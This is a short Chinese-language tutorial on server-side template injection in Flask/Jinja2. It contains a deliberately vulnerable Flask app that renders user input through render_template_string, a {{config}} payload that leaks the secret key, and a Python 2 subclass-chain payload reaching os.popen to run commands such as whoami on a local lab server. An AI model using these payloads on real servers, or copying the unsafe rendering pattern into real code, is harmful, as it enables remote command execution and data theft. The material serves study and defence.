# SSTI(Server-Side Template Injection)

服务器接受了用户的输入，过滤不严谨，将用户输入作为web应用模板的一部分，但是在通过模板引擎进行渲染的过程中，执行了用户输入的恶意代码，造成命令执行

# 沙箱逃逸

在代码执行的环境下，脱离过滤和限制，最终拿到shell权限的过程。

# 模板引擎

为了使用户界面与业务数据分离而产生，可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档

# flask-jinja2

flask使用jinja2作为框架的模板系统。jinja2是基于python的模板引擎，支持Unicode，具有集成的沙箱执行环境。在jinja2中的三种语法

- 控制结构{% %}
- 变量取值{{ }}
- 注释{# #}

# 例子

name参数可控，并且格式化输出到模板中，再做渲染，通过python2运行

```python
from flask import Flask, templating
from flask import request
from flask import config
from flask import  render_template_string,render_template

app=Flask(__name__)
app.config['SECRET_KEY']="flag{SSTI_123}"#通过http://127.0.0.1:888/123?name={{config}}泄露
@app.route('/123')#设置目录
def app_index():
    template='''{%% block body %%} <div class="center-content error"><h1>hello</h1><h3>%s</h3></div>{%% endblock %%}''' %(request.args.get('name'))#创建模板
    #template.globals['os']=os #在模板环境中注册os模块,才能直接调用eval
    return render_template_string(template)#渲染

if __name__=='__main__':
    app.run(host='0.0.0.0',port=888)#设置ip和端口
```

由于沙箱原因不能直接eval执行命令，寻找payload攻击链，进入python2

1. 找到元组的所属类`().__class__`
2. 找到基类`().__class__.__bases__`
3. 查看子类`().__class__.__bases__[0].__subclasses__()`
4. 查看`site._Printer`子类`().__class__.__bases__[0].__subclasses__()[72]`
5. 以字典的形式在`site._Printer`查找注册的模块`().__class__.__bases__[0].__subclasses__()[72].__init__.__globals__`
6. 最后一个存在os模块，可以利用

```
().__class__.__bases__[0].__subclasses__()[72].__init__.__globals__['os'].popen('notepad').read()
```

最后通过访问`http://127.0.0.1:888/123?name={{().__class__.__bases__[0].__subclasses__()[72].__init__.__globals__['os'].popen('whoami').read()}}`执行命令

